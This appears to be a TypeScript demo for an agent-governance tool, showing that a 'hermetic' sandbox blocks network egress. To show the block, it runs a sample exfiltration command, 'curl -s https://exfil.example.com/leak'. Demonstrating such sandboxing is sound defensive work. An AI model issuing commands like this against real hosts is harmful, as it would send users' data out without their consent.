import { rmSync } from "node:fs";

import { hermeticBackend } from "@warrant/session-hermetic";
import { makeRepo, startStack } from "@warrant/testkit";
import { captureWorkspace } from "@warrant/workspace";

import { renderReceipt } from "@warrant/cli/render";
import { banner, detail, expectedFailure, finale, ok, step } from "@warrant/example-utils";

const POOL = "eng-prod";

async function run(
  stack: Awaited<ReturnType<typeof startStack>>,
  repoDir: string,
  prompt: string,
  allowHosts: string[] = []
) {
  const captured = captureWorkspace(repoDir);
  await stack.client.putBlob(captured.bundle);
  if (captured.dirtyDiff) await stack.client.putBlob(captured.dirtyDiff);
  const created = await stack.client.requestRun({
    requestedBy: { kind: "human", id: "dana@example.com" },
    agentKind: "command",
    prompt,
    pool: POOL,
    secretNames: [],
    workspace: captured.manifest,
    network: { defaultDeny: true, allowHosts },
    budget: {},
    disclosure: "minimal-context",
    isolation: "hermetic"
  });
  await stack.runOnce();
  return stack.client.getBundle(created.runId);
}

const DEMO_ID = "13";
const DEMO_TITLE = "hermetic session isolation";
const DEMO_SUMMARY =
  "Run the command harness inside a simulated bash interpreter (just-bash) with a virtual filesystem and interpreter-enforced egress. No real process, no real socket — nothing to escape with. The receipt records isolation: hermetic.";

async function main(): Promise<void> {
  banner(DEMO_ID, DEMO_TITLE, DEMO_SUMMARY);

  step("boot a plane + runner with the hermetic backend registered");
  const stack = await startStack({
    pool: POOL,
    startRunner: true,
    backends: [hermeticBackend()],
    policy: (policy) => {
      policy.agents.allow = ["command"];
      policy.network.allowHosts = ["example.com"];
    }
  });
  const repo = makeRepo({
    files: { "README.md": "# checkout-service\n", "orders.csv": "id,total\n1,9\n2,12\n3,7\n" }
  });
  try {
    step("a governed command runs entirely inside the interpreter");
    const work = await run(
      stack,
      repo,
      "awk -F, 'NR>1 {s+=$2} END {print s}' orders.csv > total.txt && cat total.txt"
    );
    ok(`run ${work.receipt.runId} [${work.receipt.status}], isolation: ${work.receipt.runner.isolation}`);
    detail(renderReceipt(work));

    step("egress is interpreter-enforced: with no host allowlisted, curl does not exist");
    const exfil = await run(
      stack,
      repo,
      "curl -s https://exfil.example.com/leak || echo 'BLOCKED: no socket in a hermetic session'"
    );
    const logEvent = exfil.events.find(
      (e) => e.event.type === "artifact.created" && e.event.kind === "log"
    );
    if (logEvent && logEvent.event.type === "artifact.created") {
      const log = (await stack.client.getBlob(logEvent.event.hash)).toString("utf8");
      expectedFailure(`session output: ${log.trim().split("\n").pop() ?? ""}`);
    }

    finale(
      "hermetic isolation: stronger than process-level, no VM required — recorded honestly in the receipt"
    );
  } finally {
    await stack.stop();
    rmSync(repo, { recursive: true, force: true });
  }
}

main().catch((error: unknown) => {
  console.error(error instanceof Error ? error.stack ?? error.message : String(error));
  process.exit(1);
});
